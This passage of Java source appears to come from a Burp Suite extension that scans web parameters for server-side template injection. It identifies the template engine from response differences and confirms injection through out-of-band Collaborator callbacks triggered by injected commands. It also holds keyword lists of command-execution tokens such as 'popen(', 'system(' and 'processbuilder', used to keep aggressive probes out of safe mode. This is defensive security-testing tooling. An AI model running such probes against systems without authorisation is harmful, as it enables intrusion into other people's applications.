            identifiedEngine = identifyEngine(original, target, baselineBody, aggressiveMode);
        }

        // Step 5: OOB is aggressive and runs only after safe direct probes. If the
        // engine is known, send only its payloads; otherwise use the deduplicated fallback battery.
        if (isOobConfirmed(original, target)) return;
        if (oobEnabled) {
            testOobSsti(original, target, identifiedEngine);
        }
    }

    private record ProbeInstance(String payload, String expected, String engineHint) {}

    private static ProbeInstance instantiatePolyglot(String[] probe) {
        String payload = probe[0];
        String expected = probe[1];
        if (SSTI_EXPECTED.equals(expected)) {
            int a = ThreadLocalRandom.current().nextInt(113, 997);
            int b = ThreadLocalRandom.current().nextInt(113, 997);
            String product = String.valueOf((long) a * b);
            payload = payload
                    .replace("133 * 991", a + " * " + b)
                    .replace("133.*(991)", a + ".*(" + b + ")")
                    .replace("133 | times: 991", a + " | times: " + b)
                    .replace("131000+803", a + "*" + b)
                    .replace("133*991", a + "*" + b)
                    .replace(SSTI_EXPECTED, product);
            expected = product;
        }
        return new ProbeInstance(payload, expected, probe[2]);
    }

    static String matchExpected(String body, String baselineBody,
                                        String payload, String expected) {
        if (body == null || expected == null || expected.isEmpty() || body.contains(payload)) return null;
        String baseline = baselineBody == null ? "" : baselineBody;
        for (String candidate : expected.split("\\|")) {
            String token = candidate.trim();
            if (token.isEmpty() || payload.contains(token)) continue;
            if (baseline.isEmpty() && token.matches("\\d+")) continue;
            if (body.contains(token) && !baseline.contains(token)) return token;
        }
        return null;
    }

    static boolean isAggressivePolyglot(String payload) {
        String lower = payload.toLowerCase(Locale.ROOT);
        return lower.contains("utility.execute") || lower.contains("execsync")
                || lower.contains("constructor.constructor") || lower.contains("range.constructor")
                || lower.contains("{php}") || lower.contains("{% debug %}")
                || lower.contains("popen(") || lower.contains("system(");
    }

    static boolean isAggressiveEngineProbe(String payload, String description) {
        String probe = (payload + " " + description).toLowerCase(Locale.ROOT);
        return probe.contains("aggressive") || probe.contains("objectconstructor")
                || probe.contains("request.environ") || probe.contains("__globals__")
                || probe.contains("__subclasses__") || probe.contains("__builtins__")
                || probe.contains("get_admin_log") || probe.contains("dump(app")
                || probe.contains("runtime") || probe.contains("processbuilder")
                || probe.contains("popen(") || probe.contains("system(")
                || probe.contains("phpinfo") || probe.contains("directoryiterator");
    }

    private String identifyEngine(HttpRequestResponse original, InjectionTarget target,
                                    String baselineBody, boolean aggressiveMode) {
        String url = original.request().url();

        for (Map.Entry<String, String[][]> engineEntry : ENGINE_PROBES.entrySet()) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return null;
            String engine = engineEntry.getKey();
            String[][] probes = engineEntry.getValue();

            for (String[] probe : probes) {
                if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return null;
                String payload = probe[0];
                String expected = probe[1];
                String desc = probe[2];

                // Safe mode must not execute commands, enumerate classes/runtime objects,
                // or disclose application configuration while identifying an engine.
                if (!aggressiveMode && isAggressiveEngineProbe(payload, desc)) continue;

                try {

                    HttpRequestResponse result = sendPayload(original, target, payload);
                    if (result == null || result.response() == null) continue;

                    String body = result.response().bodyToString();
                    if (body == null) body = "";

                    // Without a real baseline we can't distinguish naturally-present tokens from
                    // template evaluation output. Skip rather than guess.
                    if (baselineBody == null || baselineBody.isEmpty()) continue;

                    // Hard pre-check: if the literal payload (or the unique inner expression)
                    // appears verbatim in the response, the template was NOT evaluated — the app
                    // is just reflecting input. Apply this universally; the previous keyword-based
                    // skip-list let RCE/version/config/class/globals probes through, which was the
                    // primary FP source when sanitizers reflected the raw payload.
                    if (body.contains(payload)) continue;

                    // Check for expected output (still requires baseline-diff).
                    boolean matched = false;
                    String matchedToken = null;
                    if (expected.contains("|")) {
                        for (String exp : expected.split("\\|")) {
                            String t = exp.trim();
                            if (t.isEmpty()) continue;
                            if (body.contains(t) && !baselineBody.contains(t)) {
                                matched = true;
                                matchedToken = t;
                                break;
                            }
                        }
                    } else {
                        if (body.contains(expected) && !baselineBody.contains(expected)) {
                            matched = true;
                            matchedToken = expected;
                        }
                    }

                    if (matched) {
                        // Defensive: the matched token must not be a substring of the payload itself.
                        // If it is, the probe is intrinsically reflection-shaped (e.g. a probe that
                        // expects its own string literal) and cannot be trusted as engine evidence.
                        if (matchedToken != null && payload.contains(matchedToken)) {
                            continue;
                        }

                        Severity severity = desc.contains("RCE") ? Severity.CRITICAL : Severity.HIGH;
                        Confidence confidence = Confidence.CERTAIN;

                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Engine Identified: " + engine + " - " + desc,
                                        severity, confidence)
                                .url(url).parameter(target.name)
                                .evidence("Payload: " + payload + " | Expected '" + expected + "' found")
                                .description("Template engine positively identified as " + engine
                                        + ". " + desc + ".")
                                .requestResponse(result)
                                .payload(payload)
                                .responseEvidence(matchedToken)
                                .build());
                        return engine; // Engine identified, done
                    }

                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            }
        }
        return null;
    }

    private void testOobSsti(HttpRequestResponse original, InjectionTarget target, String identifiedEngine) {
        String url = original.request().url();
        Set<String> sentTemplates = new HashSet<>();
        for (String[] payloadInfo : OOB_SSTI_PAYLOADS) {
            if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
            if (isOobConfirmed(original, target)) return;
            String payloadTemplate = payloadInfo[0];
            String technique = payloadInfo[1];
            if (!payloadTemplate.contains("COLLAB_PLACEHOLDER") || !sentTemplates.add(payloadTemplate)) continue;

            // If engine was identified, only send OOB payloads for that engine and related engines
            if (identifiedEngine != null) {
                String techLower = technique.toLowerCase();
                String engineLower = identifiedEngine.toLowerCase();
                // Use word-boundary match to avoid substring false positives
                // (e.g., engine "EL" matching "mod*el*" in an unrelated technique)
                boolean match = techLower.matches(".*\\b" + Pattern.quote(engineLower) + "\\b.*");
                // Thymeleaf uses Spring EL, so include Spring EL payloads when Thymeleaf is detected
                if (!match && engineLower.contains("thymeleaf")) {
                    match = techLower.contains("spring el");
                }
                // Spring EL apps often use Thymeleaf as the view layer
                if (!match && engineLower.contains("spring")) {
                    match = techLower.contains("thymeleaf") || techLower.contains("spring el");
                }
                if (!match) continue;
            }

            // AtomicReference to capture the sent request/response for the finding
            AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
            AtomicReference<String> sentPayload = new AtomicReference<>();

            String collabPayload = collaboratorManager.generatePayload(
                    "ssti-scanner", url, target.name,
                    "SSTI OOB " + technique,
                    interaction -> {
                        // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
                        // fires on a 5-second interval so this race is rare, but when it happens the 50ms
                        // wait is almost always enough for the sending thread to complete its set() call.
                        for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
                        }
                        // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                        if (interaction.type() == InteractionType.HTTP) {
                            oobConfirmedTargets.add(scanTargetKey(original.request(), target));
                        }
                        findingsStore.addFinding(Finding.builder("ssti-scanner",
                                        "SSTI Confirmed (Out-of-Band) - " + technique,
                                        Severity.CRITICAL,
                                        interaction.type() == InteractionType.HTTP ? Confidence.CERTAIN : Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Technique: " + technique
                                        + " | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp())
                                .description("Server-Side Template Injection confirmed via Burp Collaborator. "
                                        + "The template engine executed the injected command, triggering a "
                                        + interaction.type().name() + " callback.")
                                .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
                                .payload(sentPayload.get())
                                .build());
                        api.logging().logToOutput("[SSTI OOB] Confirmed! " + technique
                                + " at " + url + " param=" + target.name);
                    }
            );

            if (collabPayload == null) continue;
            String payload = collaboratorManager.resolveTemplate(payloadTemplate, collabPayload);
            sentPayload.set(payload);

            try {
                sentRequest.set(sendPayload(original, target, payload));
                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectionTarget target, String payload) {
        if (com.omnistrike.framework.ScanState.isCancelled()) return null;
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            HttpRequestResponse result = StepperHttp.sendRequest(modified);
            if (!ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, InjectionTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return PayloadEncoder.injectCookie(request, target.name, payload);
            case JSON:
                return request.withBody(JsonScanSupport.replaceValue(
                        request.bodyToString(), target.jsonPath, payload));
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    private List<InjectionTarget> extractTargets(HttpRequest request) {
        List<InjectionTarget> targets = new ArrayList<>();
        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new InjectionTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }
        // JSON params (recursive for nested objects)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.toLowerCase(Locale.ROOT).contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    for (JsonScanSupport.Target jsonTarget : JsonScanSupport.extractTargets(body)) {
                        targets.add(new InjectionTarget(jsonTarget.displayName(), jsonTarget.value(),
                                TargetType.JSON, jsonTarget.path()));
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract ALL injectable request headers (skip non-injectable framework headers)
        Set<String> skipHeaders = Set.of("host", "content-length", "connection", "accept-encoding",
                "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                "upgrade-insecure-requests", "if-modified-since", "if-none-match",
                "authorization", "proxy-authorization", "content-type", "accept",
                "accept-language", "cache-control", "pragma", "origin",
                "cookie"); // individual cookies already extracted as COOKIE parameters
        for (var h : request.headers()) {
            if (!skipHeaders.contains(h.name().toLowerCase())) {
                targets.add(new InjectionTarget(h.name(), h.value(), TargetType.HEADER));
            }
        }

        return targets;
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private boolean isOobConfirmed(HttpRequestResponse original, InjectionTarget target) {
        // An explicit manual rescan must not be short-circuited by a previous callback.
        if (dedup != null && dedup.isBypass()) return false;
        return oobConfirmedTargets.contains(scanTargetKey(original.request(), target));
    }

    private static String scanTargetKey(HttpRequest request, InjectionTarget target) {
        return ScanTargetIdentity.build(request.url(), request.method(),
                target.type.name(), target.identityName());
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("ssti.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() {
        tested.clear();
        oobConfirmedTargets.clear();
    }

    private enum TargetType { QUERY, BODY, COOKIE, JSON, HEADER }

    private static class InjectionTarget {
        final String name, originalValue;
        final TargetType type;
        final List<Object> jsonPath;
        InjectionTarget(String n, String v, TargetType t) { this(n, v, t, null); }
        InjectionTarget(String n, String v, TargetType t, List<Object> jsonPath) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
            this.jsonPath = jsonPath == null ? null : List.copyOf(jsonPath);
        }
        String identityName() {
            if (jsonPath == null) return name;
            StringBuilder out = new StringBuilder();
            for (Object part : jsonPath) {
                if (part instanceof String key) {
                    out.append('/').append(key.replace("~", "~0").replace("/", "~1"));
                } else {
                    out.append('/').append(part);
                }
            }
            return out.toString();
        }
        boolean matchesParameterName(String requested) {
            if (requested == null) return false;
            if (name.equalsIgnoreCase(requested)) return true;
            if (jsonPath != null && !jsonPath.isEmpty()
                    && jsonPath.get(jsonPath.size() - 1) instanceof String key) {
                return key.equalsIgnoreCase(requested);
            }
            return false;
        }
    }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
